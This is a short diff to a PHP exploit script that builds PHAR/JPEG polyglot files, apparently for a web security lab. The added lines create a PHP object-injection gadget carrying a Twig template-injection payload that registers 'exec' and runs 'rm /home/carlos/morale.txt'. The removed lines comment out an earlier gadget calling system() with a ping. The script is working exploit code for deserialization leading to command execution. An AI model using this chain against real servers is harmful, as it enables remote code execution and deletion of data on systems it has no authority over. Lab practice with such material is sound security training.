@@ -1,6 +1,12 @@
 <?php
 
-
+class CustomTemplate {}
+class Blog {}
+$object = new CustomTemplate;
+$blog = new Blog;
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+$blog->user = 'user';
+$object->template_file_path = $blog;
 function generate_base_phar($o, $prefix){
     global $tempname;
     @unlink($tempname);
@@ -34,11 +40,11 @@ function generate_polyglot($phar, $jpeg){
 }
 
 
-// pop exploit class
-class PHPObjectInjection {}
-$object = new PHPObjectInjection;
-$object->inject = 'system("ping -c 10 127.0.0.1");';
-$object->out = 'Hallo World';
+// // pop exploit class
+// class PHPObjectInjection {}
+// $object = new PHPObjectInjection;
+// $object->inject = 'system("ping -c 10 127.0.0.1");';
+// $object->out = 'Hallo World';
 
 
 
